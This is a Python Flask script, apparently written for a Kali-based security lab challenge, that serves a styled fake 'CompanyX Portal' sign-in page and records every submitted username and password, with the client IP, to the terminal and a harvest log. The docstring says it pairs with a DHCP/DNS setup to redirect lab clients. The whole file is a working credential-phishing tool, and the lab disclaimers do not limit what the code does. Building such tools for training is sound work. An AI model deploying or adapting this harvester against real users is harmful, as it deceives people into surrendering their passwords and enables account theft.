"""Styled login clone + credential catcher for Challenge 2 (Path B).

This serves a realistic-looking portal login page (self-contained HTML, no
external resources, so it works offline) and captures whatever is submitted.
It is robust: there is no external source page to fetch and nothing breaks on
HTTPS/JS. The HTTP listener binds 0.0.0.0:80, so it answers on whatever address
Kali holds (this keeps only the listener reachable; it does not change the DNS
mapping). Submitted test fields print to this terminal and are appended to a log
file whose exact path is printed at startup.

Run on Kali in its own terminal (keep the DHCP/DNS terminal running):
    sudo python3 ~/scripts/catcher.py

NOTE: run with sudo, "~" is root's home, so the log is /root/harvest.log — not
your normal user's home. The startup line prints the exact path; use that.

Use ONLY test credentials created for this lab. Never enter a real password.
"""
import os
from datetime import datetime
from flask import Flask, request

app = Flask(__name__)

# One fixed, absolute log location. Under sudo this resolves to /root/harvest.log;
# the exact value is printed at startup so it is never ambiguous where to look.
LOG_PATH = os.path.expanduser("~/harvest.log")

PAGE = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CompanyX Portal — Sign in</title>
<style>
  :root { --brand:#1f4e8c; --bg:#eef2f7; --ink:#1a2330; --muted:#6b7686; }
  * { box-sizing:border-box; }
  body { margin:0; min-height:100vh; display:flex; align-items:center;
         justify-content:center; background:var(--bg);
         font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
         color:var(--ink); }
  .card { width:360px; max-width:92vw; background:#fff; border-radius:12px;
          box-shadow:0 10px 30px rgba(20,40,80,.12); padding:32px 28px; }
  .brand { display:flex; align-items:center; gap:10px; margin-bottom:22px; }
  .logo { width:34px; height:34px; border-radius:8px; background:var(--brand);
          color:#fff; display:flex; align-items:center; justify-content:center;
          font-weight:700; }
  h1 { font-size:18px; margin:0; }
  .sub { color:var(--muted); font-size:13px; margin:2px 0 22px; }
  label { display:block; font-size:13px; margin:14px 0 6px; }
  input { width:100%; padding:11px 12px; border:1px solid #d3dae4;
          border-radius:8px; font-size:14px; }
  input:focus { outline:none; border-color:var(--brand);
                box-shadow:0 0 0 3px rgba(31,78,140,.15); }
  button { width:100%; margin-top:22px; padding:11px; border:0;
           border-radius:8px; background:var(--brand); color:#fff;
           font-size:15px; font-weight:600; cursor:pointer; }
  .foot { margin-top:18px; font-size:12px; color:var(--muted);
          text-align:center; }
  .note { margin-top:16px; font-size:11px; color:#9aa4b2; text-align:center; }
</style>
</head>
<body>
  <div class="card">
    <div class="brand">
      <div class="logo">CX</div>
      <div><h1>CompanyX Portal</h1></div>
    </div>
    <div class="sub">Sign in to continue</div>
    <form method="POST" action="/login">
      <label for="u">Username</label>
      <input id="u" name="username" autocomplete="username" placeholder="username">
      <label for="p">Password</label>
      <input id="p" name="password" type="password"
             autocomplete="current-password" placeholder="password">
      <button type="submit">Log in</button>
    </form>
    <div class="foot">Forgot your password?</div>
    <div class="note">Lab environment — submit test credentials only.</div>
  </div>
</body>
</html>"""


@app.route("/")
def index():
    return PAGE


@app.route("/login", methods=["POST"])
def login():
    u = request.form.get("username", "")
    p = request.form.get("password", "")
    line = f"{datetime.now().isoformat(timespec='seconds')}  {request.remote_addr}  user={u}  pass={p}"
    # Receipt in the terminal is the primary evidence; the file save is a
    # separate result that may fail. Report each independently, so a failed
    # write is never hidden behind a "recorded" message.
    print("CAPTURED  " + line, flush=True)
    try:
        with open(LOG_PATH, "a") as fh:
            fh.write(line + "\n")
        print(f"          saved to {LOG_PATH}", flush=True)
    except OSError as exc:
        print(f"          WARNING: could not write {LOG_PATH}: {exc}", flush=True)
    return "Lab test submission recorded.", 200


# 0.0.0.0 => the listener answers on whatever IP Kali currently holds; no
# hard-coded address. (This affects only the listener, not the DNS mapping.)
print(f"[catcher] captured submissions will be logged to: {LOG_PATH}", flush=True)
app.run(host="0.0.0.0", port=80)
